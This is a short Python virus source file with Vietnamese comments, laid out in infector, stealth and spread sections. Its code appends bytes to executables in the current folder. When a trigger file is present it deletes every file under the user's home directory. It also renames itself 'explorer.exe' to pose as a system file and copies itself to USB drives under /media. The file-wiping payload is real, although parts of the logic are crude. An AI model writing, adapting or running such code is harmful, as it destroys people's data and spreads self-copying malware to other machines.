import os
import shutil

# Phần Infector (Phần Nhiễm)
def infect_files(virus_code):

    executable_files = [file for file in os.listdir() if os.path.isfile(file) and os.access(file, os.X_OK)]
    
    for file in executable_files:
        with open(file, 'ab') as f:
            f.write(virus_code)

def execute_payload():

    user_directory = os.path.expanduser("~")
    for root, dirs, files in os.walk(user_directory):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except Exception as e:
                pass

def trigger_condition():

    specific_file = "important_document.docx"
    return specific_file in os.listdir()

# Phần Stealth (Phần Ẩn)
def hide_virus():

    system_file = "explorer.exe"
    os.rename(__file__, system_file)

# Phần Spread (Phần Lan Truyền)
def spread_to_other_systems():

    usb_devices = [drive for drive in os.listdir('/media') if os.path.isdir(os.path.join('/media', drive))]
    for device in usb_devices:
        shutil.copy(__file__, os.path.join('/media', device))


def control_behavior():

    if os.path.basename(__file__) != "explorer.exe":
        shutil.copy("explorer.exe", __file__)

#main
def main():

    virus_code = b"('Do you know me')"
    
    infect_files(virus_code)
    if trigger_condition():
        execute_payload()
    hide_virus()
    spread_to_other_systems()
    control_behavior()


if __name__ == "__main__":
    main()